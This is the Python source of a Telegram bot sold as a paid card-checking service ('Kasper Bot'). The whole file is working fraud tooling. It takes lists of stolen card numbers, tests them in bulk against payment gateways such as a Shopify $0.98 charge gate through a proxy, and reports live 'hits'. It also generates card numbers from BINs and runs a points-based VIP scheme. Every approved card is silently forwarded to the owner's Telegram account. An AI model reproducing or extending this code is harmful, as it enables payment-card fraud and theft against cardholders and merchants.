import asyncio
import threading
import os

# حل مشكلة الـ Event Loop فوراً قبل استدعاء الموديلات الكبيرة
try:
    loop = asyncio.get_event_loop()
except RuntimeError:
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

# 🌐 إضافة سيرفر وهمي صغير لخدعة منفذ Render (Port Binding)
from http.server import BaseHTTPRequestHandler, HTTPServer

class HealthCheckHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")
    def log_message(self, format, *args):
        return  # كتم سجلات السيرفر الوهمي حتى ما توشوش على لغات البوت

def run_health_server():
    port = int(os.environ.get("PORT", 10000))
    server = HTTPServer(('0.0.0.0', port), HealthCheckHandler)
    server.serve_forever()

import re
import time
import warnings
warnings.filterwarnings("ignore", category=Warning)
import secrets
import json
from datetime import datetime, timedelta
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup

from gates.ka import kasper_gate
from gates.te import test_gate
from gates.br import br_gate
from gates.vi import vi_gate
from utils.database import setup_db, check_vip, deduct_point, add_points
from utils.helpers import cc_gen, parse_cc, get_bin_info
from utils.subscription import is_subscribed, send_sub_msg

with open('config.json', 'r') as f:
    config = json.load(f)

OWNER_ID = config['bot']['owner_id']
API_ID = config['bot']['api_id']
API_HASH = config['bot']['api_hash']
BOT_TOKEN = config['bot']['bot_token']
BOT_USERNAME = config['bot']['bot_username']
OWNER_URL = config['bot']['owner_url']
TEMP_FOLDER = config['temp_folder']
PROXY_CONFIG = config.get('proxy', None)

os.makedirs(TEMP_FOLDER, exist_ok=True)

app = Client(":memory:", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN, in_memory=True)

gates = {
    'Kaspper': {"command": "ka", "def": kasper_gate, "type": "auth", "full_name": "Kasper Gateway"},
    'Zoura': {"command": "te", "def": test_gate, "type": "auth", "full_name": "Zoura Auth"},
    'Br': {"command": "br", "def": br_gate, "type": "auth", "full_name": "Br Gateway"},
    'Vi': {"command": "vi", "def": vi_gate, "type": "charge", "full_name": "Shopify 0.98$ Charg"},
}

user_cancel_flag = {}
semaphore = asyncio.Semaphore(10)

async def send_no_points_msg(message, points):
    keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("BUY POINTS / VIP", url=OWNER_URL)]])
    await message.reply(
        "<b>INSUFFICIENT POINTS</b>\n"
        "<code>━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
        "<b>Your balance is too low to perform this action.</b>\n"
        f"<b>Current Points:</b> [ <code>{points}</code> ]\n\n"
        "<b>Please contact the owner to top up.</b>\n"
        "<code>━━━━━━━━━━━━━━━━━━━━━━━━</code>",
        reply_markup=keyboard
    )

async def process_card(client, message, cc_line, def_func, results_list, stats, gate_full_name, error_list, user_id):
    async with semaphore:
        try:
            cc, mes, ano, cvv = cc_line.split("|")
        except:
            stats['error'] += 1
            stats['done'] += 1
            return
            
        start_time = time.time()
        try:
            result, msg = await def_func(cc, mes, ano, cvv, PROXY_CONFIG)
            taken_time = round(time.time() - start_time, 1)
            results_list.append(f"{cc_line} -> {result} ({msg})")
            
            if "Approved" in result or "Declined" in result:
                deduct_point(user_id)
                
            if "Approved" in result:
                stats['live'] += 1
                country, details = await get_bin_info(cc[:6])
                hit_msg = (
                    f"<b>NEW HIT! | {gate_full_name}</b>\n"
                    f"<code>━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
                    f"<b>CC:</b> <code>{cc_line}</code>\n"
                    f"<b>STATUS: {result}</b>\n"
                    f"<b>RESPONSE: {msg}</b>\n"
                    f"<code>━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
                    f"<b>BIN:</b> <code>{cc[:6]}</code> - <b>{country}</b>\n"
                    f"<b>INFO:</b> <code>{details}</code>\n"
                    f"<b>TIME:</b> <b>({taken_time}s)</b>\n"
                    f"<code>━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
                    f"<b>CHECKED BY: {message.from_user.first_name}</b>"
                )
                await client.send_message(OWNER_ID, hit_msg)
                if user_id != OWNER_ID:
                    try:
                        await client.send_message(user_id, hit_msg)
                    except:
                        pass
            elif "Declined" in result:
                stats['dead'] += 1
            else:
                stats['error'] += 1
                error_list.append(cc_line)
        except Exception:
            stats['error'] += 1
            error_list.append(cc_line)
        stats['done'] += 1

async def update_progress_loop(message, total, stats, gate_full_name, user_id):
    while stats['done'] < total:
        if user_cancel_flag.get(user_id, False):
            break
        try:
            new_text = (f"<b>{gate_full_name.upper()} MASS CHECK 🔄</b>\n"
                        f"<b>━━━━━━━━━━━━━━━━━</b>\n"
                        f"<b>✅ APPROVED  : [ {stats['live']} ]</b>\n"
                        f"<b>❌ DECLINED  : [ {stats['dead']} ]</b>\n"
                        f"<b>⚠️ ERRORS    : [ {stats['error']} ]</b>\n"
                        f"<b>📊 PROGRESS  : {stats['done']}/{total}</b>\n"
                        f"<b>⏱ DELAY     : {config['limits']['check_delay']}s Per Card</b>\n"
                        f"<b>━━━━━━━━━━━━━━━━━</b>")
            
            kb = InlineKeyboardMarkup([[InlineKeyboardButton("🚫 Cancel Process", callback_data=f"cancel_process_{user_id}")]])
            await message.edit_text(new_text, reply_markup=kb)
        except:
            pass
        await asyncio.sleep(3)

async def process_all_cards(client, message, card_list, gate_function, message_obj, gate_full_name):
    user_id = message.from_user.id
    stats = {'live': 0, 'dead': 0, 'error': 0, 'done': 0}
    results = []
    error_cards = []
    
    is_active, _, current_pts = check_vip(user_id)
    if current_pts < len(card_list) and user_id != OWNER_ID:
        return await send_no_points_msg(message_obj, current_pts)
    
    user_cancel_flag[user_id] = False
    progress_msg = await message_obj.reply("<b>INITIALIZING MASS CHECK...</b>", quote=True)
    update_task = asyncio.create_task(update_progress_loop(progress_msg, len(card_list), stats, gate_full_name, user_id))
    
    for card in card_list:
        if user_cancel_flag.get(user_id, False):
            break
        await process_card(client, message, card, gate_function, results, stats, gate_full_name, error_cards, user_id)
        if stats['done'] < len(card_list):
            await asyncio.sleep(config['limits']['check_delay'])
    
    update_task.cancel()
    
    final_text = (f"<b>{gate_full_name.upper()} MASS CHECK DONE ✅</b>\n"
                  f"<b>━━━━━━━━━━━━━━━━━</b>\n"
                  f"<b>✅ APPROVED      : {stats['live']}</b>\n"
                  f"<b>❌ DECLINED      : {stats['dead']}</b>\n"
                  f"<b>⚠️ ERRORS        : {stats['error']}</b>\n"
                  f"<b>📊 TOTAL CHECKED : {stats['done']}</b>\n"
                  f"<b>━━━━━━━━━━━━━━━━━</b>")
    
    result_path = f"{TEMP_FOLDER}/result_{user_id}.txt"
    with open(result_path, "w", encoding="utf-8") as file:
        file.write("\n".join(results))
    
    error_path = f"{TEMP_FOLDER}/error_{user_id}.txt"
    if error_cards:
        with open(error_path, "w", encoding="utf-8") as file:
            file.write("\n".join(error_cards))
    
    buttons = [[InlineKeyboardButton("📥 DOWNLOAD RESULT", callback_data=f"download_result_{user_id}")]]
    if error_cards:
        buttons.append([InlineKeyboardButton("⚠️ GET ERRORS ONLY", callback_data=f"download_errors_{user_id}")])
    buttons.append([InlineKeyboardButton("🗑 DELETE ALL", callback_data=f"delete_result_{user_id}")])
    
    await progress_msg.edit_text(final_text, reply_markup=InlineKeyboardMarkup(buttons))
    
    if user_id in user_cancel_flag:
        del user_cancel_flag[user_id]

async def single_check(client, message, cc_line, def_func, gate_full_name):
    try:
        cc, mes, ano, cvv = cc_line.split("|")
    except:
        return await message.reply("<b>Format Error! Use CC|MM|YYYY|CVV</b>")
        
    wait = await message.reply(f"<b>Checking {cc_line}...</b>", quote=True)
    start_time = time.time()
    ci, d = await get_bin_info(cc[:6])
    res, msg = await def_func(cc, mes, ano, cvv, PROXY_CONFIG)
    if "Approved" in res or "Declined" in res:
        deduct_point(message.from_user.id)
    _, _, u_pts = check_vip(message.from_user.id)
    taken = round(time.time() - start_time, 1)
    await wait.edit_text(
        f"<b>CC:</b> <code>{cc_line}</code>\n"
        f"<b>STATUS: {res}</b>\n"
        f"<b>GATE: {gate_full_name}</b>\n"
        f"<b>RESPONSE: {msg}</b>\n\n"
        f"<b>BIN DETAILS</b>\n"
        f"<b>❖BIN:</b> <code>{cc[:6]}</code> - <b>{ci}</b>\n"
        f"<b>❖DETAILS:</b> <code>{d}</code>\n"
        f"<b>❖TIME:</b> <b>({taken}s)</b>\n\n"
        f"<b>POINTS REMAINING: {u_pts if message.from_user.id != OWNER_ID else 'INF'}</b>\n"
        f"<b>CHECKED BY {message.from_user.first_name} [VIP]</b>"
    )

@app.on_message(filters.command("start"))
async def start_cmd(client, message):
    if not await is_subscribed(client, message.from_user.id):
        return await send_sub_msg(client, message)
    
    user_id = message.from_user.id
    is_active, expiry, points = check_vip(user_id)
    if is_active:
        await message.reply(f"<b>WELCOME BACK!\n\nPOINTS: <code>{points}</code>\nEXPIRY: <code>{expiry}</code>\n\nUSE /cmds TO VIEW GATES.</b>")
    else:
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("ACTIVATE 1H FREE TRIAL", callback_data="activate_trial")],
            [InlineKeyboardButton("PURCHASE VIP ACCESS", url=OWNER_URL)]
        ])
        await message.reply(f"<b>WELCOME TO KASPER BOT!\n\nYOU DON'T HAVE AN ACTIVE SUBSCRIPTION OR POINTS.\nCLICK BELOW FOR TRIAL (10 PTS).</b>", reply_markup=keyboard)

@app.on_message(filters.command(["ka", "te", "br", "vi"], prefixes=["/", "!", ".", "$"]) & filters.text)
async def checker(client, message):
    if not await is_subscribed(client, message.from_user.id):
        return await send_sub_msg(client, message)
    
    is_active, _, pts = check_vip(message.from_user.id)
    if not is_active:
        return await send_no_points_msg(message, pts)

    cmd = message.command[0].lower().replace("/", "").replace("!", "").replace(".", "").replace("$", "")
    def_func, gate_full_name = None, ""
    for name, info in gates.items():
        if info["command"].lower() == cmd:
            def_func = info["def"]
            gate_full_name = info.get("full_name", name)
            break

    data = ""
    if message.reply_to_message and message.reply_to_message.document:
        temp_path = await message.reply_to_message.download()
        with open(temp_path, "r", encoding="utf-8") as f:
            data = f.read()
        os.remove(temp_path)
    elif message.reply_to_message and message.reply_to_message.text:
        data = message.reply_to_message.text
    else:
        args = message.text.split(maxsplit=1)
        data = args[1].strip() if len(args) > 1 else ""

    if not data:
        return await message.reply("<b>SEND CCs OR REPLY TO A FILE/TEXT MESSAGE.</b>")
    
    cards = await parse_cc(data)
    if not cards:
        return await message.reply("<b>No valid cards found.</b>")

    if len(cards) == 1:
        await single_check(client, message, cards[0], def_func, gate_full_name)
    else:
        await process_all_cards(client, message, cards, def_func, message, gate_full_name)

@app.on_message(filters.command("gen"))
async def generate_command(client, message):
    if not await is_subscribed(client, message.from_user.id):
        return await send_sub_msg(client, message)
    
    is_active, expiry, points = check_vip(message.from_user.id)
    if not is_active:
        return await send_no_points_msg(message, points)
    
    args = message.text.split()
    if len(args) < 2:
        return await message.reply("<b>Usage: <code>/gen [BIN] [Amount]</code></b>")
    
    bin_input = args[1]
    try:
        amount = int(args[2]) if len(args) > 2 else config['limits']['default_gen_amount']
    except ValueError:
        amount = config['limits']['default_gen_amount']
    
    if amount > config['limits']['max_gen_amount']:
        return await message.reply(f"<b>Maximum limit is {config['limits']['max_gen_amount']} cards.</b>")
    
    bin_clean = re.sub(r'[^0-9]', '', bin_input)[:6]
    country_info, details = await get_bin_info(bin_clean)
    cards = cc_gen(bin_input, amount)
    
    gen_msg = (
        f"<b>GENERATED BY KASPER</b>\n"
        f"<code>━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
        f"<b>BIN:</b> <code>{bin_clean}</code> - <b>{country_info}</b> (<code>{details}</code>)\n"
        f"<b>AMOUNT:</b> <code>{len(cards)}</code> | <b>POINTS:</b> <code>{points if message.from_user.id != OWNER_ID else 'INF'}</code>\n"
        f"<code>━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
        + "\n".join(cards) +
        f"\n<code>━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
        f"<b>BY:</b> <code>{message.from_user.first_name}</code> <b>[VIP]</b>\n"
        f"<b>BOT:</b> <code>{BOT_USERNAME}</code>"
    )
    await message.reply(gen_msg)

@app.on_message(filters.command("cmds"))
async def cmds_menu(client, message):
    if not await is_subscribed(client, message.from_user.id):
        return await send_sub_msg(client, message)
        
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("AUTH GATES", callback_data="show_auth"),
         InlineKeyboardButton("CHARGE GATES", callback_data="show_charge")],
        [InlineKeyboardButton("MASS CHECK", callback_data="show_mass"),
         InlineKeyboardButton("PROFILE", callback_data="show_profile")]
    ])
    await message.reply("<b>MAIN COMMANDS MENU\n\nPLEASE SELECT THE GATE TYPE YOU WANT TO VIEW:</b>", reply_markup=keyboard)

@app.on_message(filters.command("add") & filters.user(OWNER_ID))
async def add_points_direct(client, message):
    args = message.text.split()
    if len(args) < 3:
        return await message.reply("<b>Usage: <code>/add [ID] [Points]</code></b>")
    
    try:
        target_id = int(args[1])
        points_to_add = int(args[2])
    except ValueError:
        return await message.reply("<b>Error: Please enter valid ID and points (numbers only).</b>")
    
    add_points(target_id, points_to_add)
    await message.reply(f"<b>Top-up Successful!\n\nUser: <code>{target_id}</code>\nPoints Added: <code>{points_to_add}</code></b>")
    try:
        await client.send_message(target_id, f"<b>Your account has been topped up!\nPoints Added: <code>{points_to_add}</code></b>")
    except:
        pass

@app.on_message(filters.command("mcode") & filters.user(OWNER_ID))
async def make_code(client, message):
    full_code = f"KASPER-{secrets.token_hex(3).upper()}"
    import sqlite3
    conn = sqlite3.connect(config['database']['path'])
    cursor = conn.cursor()
    cursor.execute("INSERT INTO codes (code, days, points) VALUES (?, ?, ?)", (full_code, 30, 1000))
    conn.commit()
    conn.close()
    await message.reply(f"<b>NEW VIP CODE CREATED (1000 PTS):\n<code>/redeem {full_code}</code></b>")

@app.on_message(filters.command("redeem"))
async def redeem_code(client, message):
    if not await is_subscribed(client, message.from_user.id):
        return await send_sub_msg(client, message)
        
    args = message.text.split()
    if len(args) < 2:
        return await message.reply("<b>USAGE: /redeem KASPER-XXXX</b>")
    code = args[1].strip()
    
    import sqlite3
    conn = sqlite3.connect(config['database']['path'])
    cursor = conn.cursor()
    cursor.execute("SELECT days, points FROM codes WHERE code = ?", (code,))
    row = cursor.fetchone()
    if row:
        days, pts = row
        cursor.execute("DELETE FROM codes WHERE code = ?", (code,))
        expiry = (datetime.now() + timedelta(days=days)).strftime('%Y-%m-%d %H:%M:%S')
        cursor.execute("SELECT points FROM users WHERE user_id = ?", (message.from_user.id,))
        user_row = cursor.fetchone()
        current_pts = user_row[0] if user_row else 0
        cursor.execute("INSERT OR REPLACE INTO users (user_id, expiry_date, points) VALUES (?, ?, ?)",
                       (message.from_user.id, expiry, current_pts + pts))
        conn.commit()
        await message.reply(f"<b>VIP ACTIVATED!\nPOINTS ADDED: <code>{pts}</code>\nEXPIRY: <code>{expiry}</code></b>")
    else:
        await message.reply("<b>INVALID OR EXPIRED CODE.</b>")
    conn.close()

@app.on_message(filters.command(["re", "ads"]) & filters.user(OWNER_ID))
async def broadcast_handler(client, message):
    if not message.reply_to_message:
        return await message.reply("<b>Reply to a message (text/photo/video) to broadcast it.</b>")
    
    status_msg = await message.reply("<b>Broadcasting in progress...</b>")
    import sqlite3
    conn = sqlite3.connect(config['database']['path'])
    cursor = conn.cursor()
    cursor.execute("SELECT user_id FROM users")
    users = cursor.fetchall()
    conn.close()
    
    success, failed = 0, 0
    for user in users:
        try:
            await message.reply_to_message.copy(user[0])
            success += 1
            await asyncio.sleep(0.05)
        except:
            failed += 1
    
    await status_msg.edit_text(
        f"<b>BROADCAST COMPLETED</b>\n"
        f"<code>━━━━━━━━━━━━━━━━━━━━━━</code>\n"
        f"<b>Sent: {success} | Failed: {failed}</b>"
    )

@app.on_callback_query()
async def handle_buttons(client, callback_query):
    data = callback_query.data
    user_id = callback_query.from_user.id
    
    if not await is_subscribed(client, user_id):
        return await callback_query.answer("You must subscribe to the channel first!", show_alert=True)
    
    if data == "activate_trial":
        import sqlite3
        conn = sqlite3.connect(config['database']['path'])
        cursor = conn.cursor()
        cursor.execute("SELECT user_id FROM trial_users WHERE user_id = ?", (user_id,))
        if cursor.fetchone():
            conn.close()
            return await callback_query.answer("YOU HAVE ALREADY USED YOUR TRIAL!", show_alert=True)
        expiry = (datetime.now() + timedelta(hours=1)).strftime('%Y-%m-%d %H:%M:%S')
        cursor.execute("INSERT OR REPLACE INTO users (user_id, expiry_date, points) VALUES (?, ?, ?)", (user_id, expiry, 10))
        cursor.execute("INSERT INTO trial_users (user_id) VALUES (?)", (user_id,))
        conn.commit()
        conn.close()
        await callback_query.message.edit_text(f"<b>TRIAL ACTIVATED!\n\nPOINTS: 10\nEXPIRES AT: <code>{expiry}</code></b>")
        await callback_query.answer("Trial Activated Successfully!")
        return
    
    if data == "show_auth":
        menu_text = (
            "<b>🔐 GATE TYPE: AUTHENTICATION</b>\n\n"
            "<b>Available Commands:</b>\n"
            "<code>/ka xxxxxxxxxxxxxxxx|xx|xxxx|xxx</code>\n"
            "<code>/br xxxxxxxxxxxxxxxx|xx|xxxx|xxx</code>\n"
            "<code>/te xxxxxxxxxxxxxxxx|xx|xxxx|xxx</code>\n\n"
            "<b>Mass Check:</b> Reply to .txt file with any command"
        )
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton(" Kasper Gateway | ka", callback_data="gate_info_ka")],
            [InlineKeyboardButton(" Zoura Auth | te", callback_data="gate_info_te")],
            [InlineKeyboardButton(" Kasper Braintree| br", callback_data="gate_info_br")],
            [InlineKeyboardButton("⬅️ BACK", callback_data="back_to_menu")]
        ])
        await callback_query.message.edit_text(menu_text, reply_markup=keyboard)

    elif data.startswith("gate_info_"):
        gate_cmd = data.split("_")[2]
        gate_name = ""
        for name, info in gates.items():
             if info["command"] == gate_cmd:
                 gate_name = info["full_name"]
                 break
        await callback_query.answer(f"Gate: {gate_name}\nCommand: /{gate_cmd}", show_alert=True)
    
    elif data == "show_charge":
        charge_menu_text = (
            "<b>⚡️ GATE TYPE: CHARGE</b>\n\n"
            "<b>Available Commands:</b>\n"
            "<code>/vi xxxxxxxxxxxxxxxx|xx|xxxx|xxx</code>\n\n"
            "<b>Mass Check:</b> Reply to .txt file with any command"
        )
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("💳 Shopify 0.98$ Charg | vi", callback_data="gate_info_vi")],
            [InlineKeyboardButton("⬅️ BACK", callback_data="back_to_menu")]
        ])
        await callback_query.message.edit_text(charge_menu_text, reply_markup=keyboard)
    
    elif data == "show_mass":
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("BACK", callback_data="back_to_menu")]])
        await callback_query.message.edit_text("<b>MASS CHECKER\n\n━━━━━━━━━━━━━━━━━━━━\nReply to a .txt file with:\n/ka, /te, /br, or /vi\n\nEach card costs 1 point\nDelay: 10s per card</b>", reply_markup=keyboard)
    
    elif data == "show_profile":
        is_active, expiry, points = check_vip(user_id)
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("BACK", callback_data="back_to_menu")]])
        await callback_query.message.edit_text(f"<b>USER PROFILE\n\n━━━━━━━━━━━━━━━━━━━━\nID: <code>{user_id}</code>\nPOINTS: <code>{points}</code>\nEXPIRY: <code>{expiry if is_active else 'No Active Plan'}</code>\n━━━━━━━━━━━━━━━━━━━━\nUse /redeem to activate VIP</b>", reply_markup=keyboard)
    
    elif data == "back_to_menu":
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("AUTH GATES", callback_data="show_auth"),
             InlineKeyboardButton("CHARGE GATES", callback_data="show_charge")],
            [InlineKeyboardButton("MASS CHECK", callback_data="show_mass"),
             InlineKeyboardButton("PROFILE", callback_data="show_profile")]
        ])
        await callback_query.message.edit_text("<b>KASPER BOT MENU\n\n━━━━━━━━━━━━━━━━━━━━\nSelect an option below:</b>", reply_markup=keyboard)
    
    elif data.startswith("cancel_process_"):
        uid = int(data.split("_")[2])
        if uid == user_id:
            user_cancel_flag[uid] = True
            await callback_query.answer("Process Cancelled!")
    
    elif data == f"download_result_{user_id}":
        path = f"{TEMP_FOLDER}/result_{user_id}.txt"
        if os.path.exists(path):
            await callback_query.message.reply_document(path, caption="<b>CHECK RESULTS</b>")
        else:
            await callback_query.answer("No results found!")
        
    elif data == f"download_errors_{user_id}":
        path = f"{TEMP_FOLDER}/error_{user_id}.txt"
        if os.path.exists(path):
            await callback_query.message.reply_document(path, caption="<b>ERROR CARDS ONLY</b>")
        else:
            await callback_query.answer("No errors found!")
    
    elif data == f"delete_result_{user_id}":
        paths = [f"{TEMP_FOLDER}/result_{user_id}.txt", f"{TEMP_FOLDER}/error_{user_id}.txt"]
        deleted = 0
        for p in paths:
            if os.path.exists(p):
                os.remove(p)
                deleted += 1
        if deleted > 0:
            await callback_query.message.edit_text("<b>FILES DELETED SUCCESSFULLY!</b>")
        else:
            await callback_query.answer("No files to delete!")

if __name__ == "__main__":
    setup_db()
    # 🚀 تشغيل خادم فحص المنفذ الوهمي في خيط منفصل (Background Thread) لمنع تعليق بايثون
    threading.Thread(target=run_health_server, daemon=True).start()
    # 🤖 تشغيل البوت الأساسي مالتك
    app.run()
